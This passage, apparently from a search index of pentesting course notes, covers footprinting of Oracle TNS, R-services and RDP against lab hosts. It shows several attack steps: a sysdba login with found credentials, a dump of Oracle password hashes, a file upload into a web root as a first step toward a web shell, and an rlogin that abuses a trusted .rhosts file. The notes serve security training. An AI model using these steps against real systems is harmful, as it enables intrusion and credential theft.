#####################| ETA:  00:00:59\n[+] Valid credentials found: scott/tiger. Continue...\n\n...SNIP...\n</code></pre> <p>In this example, we found valid credentials for the user <code>scott</code> and his password <code>tiger</code>. After that, we can use the tool <code>sqlplus</code> to connect to the Oracle database and interact with it.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#sqlplus-log-in","title":"SQLplus - Log In","text":"<pre><code>arenwald@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE\n\nSQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023\nVersion 21.4.0.0.0\n\nCopyright (c) 1982, 2021, Oracle. All rights reserved.\n\nERROR:\nORA-28002: the password will expire within 7 days\n\n\n\nConnected to:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n\nSQL&gt; \n</code></pre> <p>If you come across the following error <code>sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory</code>, please execute the below, taken from here.</p> <pre><code>arenwald@htb[/htb]$ sudo sh -c \"echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf\";sudo ldconfig\n</code></pre> <p>There are many SQLplus commands that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#oracle-rdbms-interaction","title":"Oracle RDBMS - Interaction","text":"<pre><code>SQL&gt; select table_name from all_tables;\n\nTABLE_NAME\n------------------------------\nDUAL\nSYSTEM_PRIVILEGE_MAP\nTABLE_PRIVILEGE_MAP\nSTMT_AUDIT_OPTION_MAP\nAUDIT_ACTIONS\nWRR$_REPLAY_CALL_FILTER\nHS_BULKLOAD_VIEW_OBJ\nHS$_PARALLEL_METADATA\nHS_PARTITION_COL_NAME\nHS_PARTITION_COL_TYPE\nHELP\n\n...SNIP...\n\n\nSQL&gt; select * from user_role_privs;\n\nUSERNAME                       GRANTED_ROLE                   ADM DEF OS_\n------------------------------ ------------------------------ --- --- ---\nSCOTT                          CONNECT                        NO  YES NO\nSCOTT                          RESOURCE                       NO  YES NO\n</code></pre> <p>Here, the user <code>scott</code> has no administrative privileges. However, we can try using this account to log in as the System Database Admin (<code>sysdba</code>), giving us higher privileges. This is possible when the user <code>scott</code> has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#oracle-rdbms-database-enumeration","title":"Oracle RDBMS - Database Enumeration","text":"<pre><code>arenwald@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba\n\nSQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023\nVersion 21.4.0.0.0\n\nCopyright (c) 1982, 2021, Oracle. All rights reserved.\n\n\nConnected to:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n\n\nSQL&gt; select * from user_role_privs;\n\nUSERNAME                       GRANTED_ROLE                   ADM DEF OS_\n------------------------------ ------------------------------ --- --- ---\nSYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO\nSYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO\nSYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO\nSYS                            AQ_USER_ROLE                   YES YES NO\nSYS                            AUTHENTICATEDUSER              YES YES NO\nSYS                            CONNECT                        YES YES NO\nSYS                            CTXAPP                         YES YES NO\nSYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO\nSYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO\nSYS                            DBA                            YES YES NO\nSYS                            DBFS_ROLE                      YES YES NO\n\nUSERNAME                       GRANTED_ROLE                   ADM DEF OS_\n------------------------------ ------------------------------ --- --- ---\nSYS                            DELETE_CATALOG_ROLE            YES YES NO\nSYS                            EXECUTE_CATALOG_ROLE           YES YES NO\n...SNIP...\n</code></pre> <p>We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the <code>sys.user$</code> and try to crack them offline. The query for this would look like the following:</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#oracle-rdbms-extract-password-hashes","title":"Oracle RDBMS - Extract Password Hashes","text":"<pre><code>SQL&gt; select name, password from sys.user$;\n\nNAME                           PASSWORD\n------------------------------ ------------------------------\nSYS                            FBA343E7D6C8BC9D\nPUBLIC\nCONNECT\nRESOURCE\nDBA\nSYSTEM                         B5073FE1DE351687\nSELECT_CATALOG_ROLE\nEXECUTE_CATALOG_ROLE\nDELETE_CATALOG_ROLE\nOUTLN                          4A3BA55E08595C81\nEXP_FULL_DATABASE\n\nNAME                           PASSWORD\n------------------------------ ------------------------------\nIMP_FULL_DATABASE\nLOGSTDBY_ADMINISTRATOR\n...SNIP...\n</code></pre> <p>Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:</p> OS Path Linux <code>/var/www/html</code> Windows <code>C:\\inetpub\\wwwroot</code> <p>First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#oracle-rdbms-file-upload","title":"Oracle RDBMS - File Upload","text":"<pre><code>arenwald@htb[/htb]$ echo \"Oracle File Upload Test\" &gt; testing.txt\narenwald@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n\n[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\\inetpub\\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  \n[+] The ./testing.txt file was created on the C:\\inetpub\\wwwroot directory on the 10.129.204.235 server like the testing.txt file\n</code></pre> <p>Finally, we can test if the file upload approach worked with <code>curl</code>. Therefore, we will use a <code>GET http://&lt;IP&gt;</code> request, or we can visit via browser.</p> <pre><code>arenwald@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt\n\nOracle File Upload Test\n</code></pre>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Overview/","title":"Overview","text":"<p>The <code>Oracle Transparent Network Substrate</code> (<code>TNS</code>) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as <code>IPX/SPX</code> and <code>TCP/IP</code> protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.</p> <p>Over time, TNS has been updated to support newer technologies, including <code>IPv6</code> and <code>SSL/TLS</code> encryption which makes it more suitable for the following purposes:</p> Name resolution Connection management Load balancing Security <p>Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Scanning%20for%20R-Services/","title":"Scanning for R Services","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -sV -p 512,513,514 10.0.17.2\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-12-02 15:02 EST\nNmap scan report for 10.0.17.2\nHost is up (0.11s latency).\n\nPORT    STATE SERVICE    VERSION\n512/tcp open  exec?\n513/tcp open  login?\n514/tcp open  tcpwrapped\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 145.54 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Scanning%20for%20R-Services/#access-control-trusted-relationships","title":"Access Control &amp; Trusted Relationships","text":"<p>The primary concern for <code>r-services</code>, and one of the primary reasons <code>SSH</code> was introduced to replace it, is the inherent issues regarding access control for these protocols. R-services rely on trusted information sent from the remote client to the host machine they are attempting to authenticate to. By default, these services utilize Pluggable Authentication Modules (PAM) for user authentication onto a remote system; however, they also bypass this authentication through the use of the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files on the system. The <code>hosts.equiv</code> and <code>.rhosts</code> files contain a list of hosts (<code>IPs</code> or <code>Hostnames</code>) and users that are <code>trusted</code> by the local host when a connection attempt is made using <code>r-commands</code>. Entries in either file can appear like the following:</p> <p>Note: The <code>hosts.equiv</code> file is recognized as the global configuration regarding all users on a system, whereas <code>.rhosts</code> provides a per-user configuration.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Scanning%20for%20R-Services/#sample-rhosts-file","title":"Sample .rhosts File","text":"<pre><code>arenwald@htb[/htb]$ cat .rhosts\n\nhtb-student     10.0.17.5\n+               10.0.17.10\n+               +\n</code></pre> <p>As we can see from this example, both files follow the specific syntax of <code>&lt;username&gt; &lt;ip address&gt;</code> or <code>&lt;username&gt; &lt;hostname&gt;</code> pairs. Additionally, the <code>+</code> modifier can be used within these files as a wildcard to specify anything. In this example, the <code>+</code> modifier allows any external user to access r-commands from the <code>htb-student</code> user account via the host with the IP address <code>10.0.17.10</code>.</p> <p>Misconfigurations in either of these files can allow an attacker to authenticate as another user without credentials, with the potential for gaining code execution. Now that we understand how we can potentially abuse misconfigurations in these files let's attempt to try logging into a target host using <code>rlogin</code>.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Scanning%20for%20R-Services/#logging-in-using-rlogin","title":"Logging in Using Rlogin","text":"<pre><code>arenwald@htb[/htb]$ rlogin 10.0.17.2 -l htb-student\n\nLast login: Fri Dec  2 16:11:21 from localhost\n\n[htb-student@localhost ~]$\n</code></pre> <p>We have successfully logged in under the <code>htb-student</code> account on the remote host due to the misconfigurations in the <code>.rhosts</code> file. Once successfully logged in, we can also abuse the <code>rwho</code> command to list all interactive sessions on the local network by sending requests to the UDP port 513.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Scanning%20for%20R-Services/#listing-authenticated-users-using-rwho","title":"Listing Authenticated Users Using Rwho","text":"<pre><code>arenwald@htb[/htb]$ rwho\n\nroot     web01:pts/0 Dec  2 21:34\nhtb-student     workstn01:tty1  Dec  2 19:57  2:25       \n</code></pre> <p>From this information, we can see that the <code>htb-student</code> user is currently authenticated to the <code>workstn01</code> host, whereas the <code>root</code> user is authenticated to the <code>web01</code> host. We can use this to our advantage when scoping out potential usernames to use during further attacks on hosts over the network. However, the <code>rwho</code> daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Scanning%20for%20R-Services/#listing-authenticated-users-using-rusers","title":"Listing Authenticated Users Using Rusers","text":"<p>To provide additional information in conjunction with <code>rwho</code>, we can issue the <code>rusers</code> command. This will give us a more detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).</p> <pre><code>arenwald@htb[/htb]$ rusers -al 10.0.17.5\n\nhtb-student     10.0.17.5:console          Dec 2 19:57     2:25\n</code></pre> <p>As we can see, R-services are less frequently used nowadays due to their inherent security flaws and the availability of more secure protocols such as SSH. To be a well-rounded information security professional, we must have a broad and deep understanding of many systems, applications, protocols, etc. So, file away this knowledge about R-services because you never know when you may encounter them.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Service%20Breakdown/","title":"Service Breakdown","text":"<p>R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (<code>CSRG</code>) at the University of California, Berkeley, <code>r-services</code> were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (<code>SSH</code>) protocols and commands due to inherent security flaws built into them. Much like <code>telnet</code>, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (<code>MITM</code>) attacks.</p> <p><code>R-services</code> span across the ports <code>512</code>, <code>513</code>, and <code>514</code> and are only accessible through a suite of programs known as <code>r-commands</code>. They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time during our internal penetration tests so it is worth understanding how to approach them.</p> <p>The R-commands suite consists of the following programs:</p> <ul> <li>rcp (<code>remote copy</code>)</li> <li>rexec (<code>remote execution</code>)</li> <li>rlogin (<code>remote login</code>)</li> <li>rsh (<code>remote shell</code>)</li> <li>rstat</li> <li>ruptime</li> <li>rwho (<code>remote who</code>)</li> </ul> <p>Each command has its intended functionality; however, we will only cover the most commonly abused <code>r-commands</code>. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.</p> Command Service Daemon Port Transport Protocol Description <code>rcp</code> <code>rshd</code> 514 TCP Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the <code>cp</code> command on Linux but provides <code>no warning to the user for overwriting existing files on a system</code>. <code>rsh</code> <code>rshd</code> 514 TCP Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files for validation. <code>rexec</code> <code>rexecd</code> 512 TCP Enables a user to run shell commands on a remote machine. Requires authentication through the use of a <code>username</code> and <code>password</code> through an unencrypted network socket. Authentication is overridden by the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files. <code>rlogin</code> <code>rlogind</code> 513 TCP Enables a user to log in to a remote host over the network. It works similarly to <code>telnet</code> but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files. <p>The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/R-Services%20%28512%2C513%2C514%29/Service%20Breakdown/#etchostsequiv","title":"/etc/hosts.equiv","text":"<p>Linux Remote Management Protocols</p> <pre><code>arenwald@htb[/htb]$ cat /etc/hosts.equiv\n\n# &lt;hostname&gt; &lt;local username&gt;\npwnbox cry0l1t3\n</code></pre> <p>Now that we have a basic understanding of <code>r-commands</code>, let's do some quick footprinting using <code>Nmap</code> to determine if all necessary ports are open.</p>","tags":["Pentesting","Information_Gathering","R-Services"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RDP%20%283389%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if <code>NLA</code> is enabled on the server or not, the product version, and the hostname.</p>","tags":["Pentesting","Information_Gathering","RDP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RDP%20%283389%29/Footprinting%20the%20Service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET\nNmap scan report for 10.129.201.248\nHost is up (0.036s latency).\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-enum-encryption: \n|   Security layer\n|     CredSSP (NLA): SUCCESS\n|     CredSSP with Early User Auth: SUCCESS\n|_    RDSTLS: SUCCESS\n| rdp-ntlm-info: \n|   Target_Name: ILF-SQL-01\n|   NetBIOS_Domain_Name: ILF-SQL-01\n|   NetBIOS_Computer_Name: ILF-SQL-01\n|   DNS_Domain_Name: ILF-SQL-01\n|   DNS_Computer_Name: ILF-SQL-01\n|   Product_Version: 10.0.17763\n|_  System_Time: 2021-11-06T13:46:00+00:00\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.26 seconds\n</code></pre> <p>In addition, we can use <code>--packet-trace</code> to track the individual packages and inspect their contents manually. We can see that the <code>RDP cookies</code> (<code>mstshash=nmap</code>) used by Nmap to interact with the RDP server can be identified by <code>threat hunters</code> and various security services such as Endpoint Detection and Response (<code>EDR</code>), and can lock us out as penetration testers on hardened networks.</p> <pre><code>arenwald@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET\nSENT (0.2506s) ICMP [10.10.14.20 &gt; 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ]\nSENT (0.2507s) TCP 10.10.14.20:55516 &gt; 10.129.201.248:443 S ttl=42 id=24195 iplen=44  seq=1926233369 win=1024 &lt;mss 1460&gt;\nSENT (0.2507s) TCP 10.10.14.20:55516 &gt; 10.129.201.248:80 A ttl=55 id=50395 iplen=40  seq=0 win=1024\nSENT (0.2517s) ICMP [10.10.14.20 &gt; 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ]\nRCVD (0.2814s) ICMP [10.129.201.248 &gt; 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ]\nSENT (0.3264s) TCP 10.10.14.20:55772 &gt; 10.129.201.248:3389 S ttl=56 id=274 iplen=44  seq=2635590698 win=1024 &lt;mss 1460&gt;\nRCVD (0.3565s) TCP 10.129.201.248:3389 &gt; 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44  seq=3526777417 win=64000 &lt;mss 1357&gt;\nNSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1)\nNSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8\nNSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389]\nService scan sending probe NULL to 10.129.201.248:3389 (tcp)\nNSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18\nNSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389]\nService scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp)\nNSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389]\nNSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34\nNSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389]\nNSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4.........\nService scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server.  Version: |Microsoft Terminal Services|||\n\n...SNIP...\n\nNSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 [10.129.201.248:3389]\nNSE: TCP 10.10.14.20:36630 &gt; 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69    *%      Cooki\n00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap\n00000020: 0d 0a 01 00 08 00 0b 00 00 00  \n\n...SNIP...\n\nNSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389]\nNSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389]\nNSE: TCP 10.10.14.20:36630 &gt; 10.129.201.248:3389 | SEND\nNSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74\nNSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes)\nNSE: TCP 10.10.14.20:36630 &lt; 10.129.201.248:3389 | \n00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0          0  0\n00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02        NTLMSSP\n00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9        8   5\n00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s              p\n00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49  p L     cE    I\n00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S\n00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49  Q L - 0 1     I\n00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S\n000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49  Q L - 0 1     I\n000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00  1\n000000d0: 00 00 00\n\n...SNIP...\n</code></pre> <p>A Perl script named rdp-sec-check.pl has also been developed by Cisco CX Security Labs that can unauthentically identify the security settings of RDP servers based on the handshakes.</p>","tags":["Pentesting","Information_Gathering","RDP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RDP%20%283389%29/Footprinting%20the%20Service/#rdp-security-check-installation","title":"RDP Security Check - Installation","text":"<pre><code>arenwald@htb[/htb]$ sudo cpan\n\nLoading internal logger. Log::Log4perl recommended for better logging\n\nCPAN.pm requires configuration, but most of it can be done automatically.\nIf you answer 'no' below, you will enter an interactive dialog for each\nconfiguration option instead.\n\nWould you like to configure as much as possible automatically? [yes] yes\n\n\nAutoconfiguration complete.\n\ncommit: wrote '/root/.cpan/CPAN/MyConfig.pm'\n\nYou can re-run configuration any time with 'o conf init' in the CPAN shell\n\ncpan shell -- CPAN exploration and modules installation (v2.27)\nEnter 'h' for help.\n\n\ncpan[1]&gt; install Encoding::BER\n\nFetching with LWP:\nhttp://www.cpan.org/authors/01mailrc.txt.gz\nReading '/root/.cpan/sources/authors/01mailrc.txt.gz'\n............................................................................DONE\n...SNIP...\n</code></pre>","tags":["Pentesting","Information_Gathering","RDP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RDP%20%283389%29/Footprinting%20the%20Service/#rdp-security-check","title":"RDP Security Check","text":"<pre><code>arenwald@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check\narenwald@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248\n\nStarting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  7 16:50:32 2021\n\n[+] Scanning 1 hosts\n\nTarget:    10.129.201.248\nIP:        10.129.201.248\nPort:      3389\n\n[+] Checking supported protocols\n\n[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported\n\n[+] Checking RDP Security Layer\n\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported\n\n[+] Summary of protocol support\n\n[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE\n[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE\n[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE\n\n[+] Summary of RDP encryption support\n\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE\n\n[+] Summary of security issues\n\n\nrdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021\n</code></pre> <p>Authentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using <code>xfreerdp</code>, <code>rdesktop</code>, or <code>Remmina</code> and interact with the GUI of the server accordingly.</p>","tags":["Pentesting","Information_Gathering","RDP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RDP%20%283389%29/Footprinting%20the%20Service/#initiate-an-rdp-session","title":"Initiate an RDP Session","text":"<pre><code>arenwald@htb[/htb]$ xfreerdp /u:cry0l1t3 /p:\"P455w0rd!\" /v:10.129.201.248\n\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr\n[16:37:47:447] [95319:95320] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized\n[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state\n[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state\n[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory /home/cry0l1t3/.config/freerdp\n[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory [/home/cry0l1t3/.config/freerdp/certs]\n[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - created directory [/home/cry0l1t3/.config/freerdp/server]\n[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0\n[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - CN = ILF-SQL-01\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.201.248:3389) \n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - Common Name (CN):\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] -      ILF-SQL-01\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!\nCertificate details for 10.129.201.248:3389 (RDP-Server):\n        Common Name: ILF-SQL-01\n        Subject:     CN = ILF-SQL-01\n        Issuer:      CN = 